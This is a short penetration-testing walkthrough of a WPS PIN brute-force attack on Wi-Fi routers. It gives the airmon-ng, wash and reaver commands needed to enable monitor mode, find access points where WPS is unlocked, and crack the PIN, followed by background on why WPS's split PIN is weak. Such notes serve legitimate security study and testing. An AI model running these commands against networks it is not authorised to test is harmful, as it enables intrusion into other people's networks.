# WPS pin attack

## Attack tree

```text
1 Verify wireless NIC
2 Scan for potential WPS vulnerable networks
3 Brute-force the WPS pin
```

## Example

### Verify wireless NIC

View and document wireless adapter:

```text
# airmon-ng
```

Create an interface that runs in monitor mode:

```text
# airmon-ng start wlan0
```
Write down interface name (something like `wlan0mon`)

### Scan for potential WPS vulnerable networks

Wash is included in the Reaver package:

```text
# wash -i wlan0mon
```

In the list are the BSSIDs (MAC address) of the access points, the channel, and the ESSID (network name), and whether 
the WPS protocol is locked (in other words, whether it is protected from WPS brute-force attacks). Look for a `no`.

### Brute-force the WPS pin

Using Reaver:

```text
# reaver -c <channel> -b <bssid> -i <interface> -vv
```

## Notes

Wi-Fi Protected Setup, or WPS, is a wireless standard protocol used by WPA and WPA2 protected networks that helps 
autoconfigure wireless clients with the wireless encryption password so that they do not need to input the password. 
WPS is commonly found in consumer appliances and may use in-band methods, such as using a personal identification 
number (PIN) during setup or pushing a button to initiate the network discovery process, or out-of-band methods such 
as near field communication (NFC), where proximity initiates the connection.

* Many wireless access points and routers have a WPS button that you can press to connect a wireless 
client to the network via the WPS protocol. After clicking the button, you then go to the client device (typically 
a laptop or a smartphone) and choose to connect to the wireless network. You are automatically connected without 
needing to input the wireless password because the wireless access point or router has communicated the configuration 
information to the client for you.
* As part of the WPS standard, wireless access points and routers that support WPS must have an 8-digit pin configured. 
This can be viewed on the wireless access point. When connecting the client to the wireless network, the pin can be 
supplied instead of the wireless password.

The problem with WPS is that the WPS–enabled router is vulnerable to having the WPS cracked due to the fact that the 
pin was originally designed as two 4-pin blocks. It is much quicker to crack two 4-pin blocks than it is one 
8-pin block.

## Tools

* [airmon-ng](https://aircrack-ng.org/doku.php?id=airmon-ng)
* [reaver](https://www.kali.org/tools/reaver/)
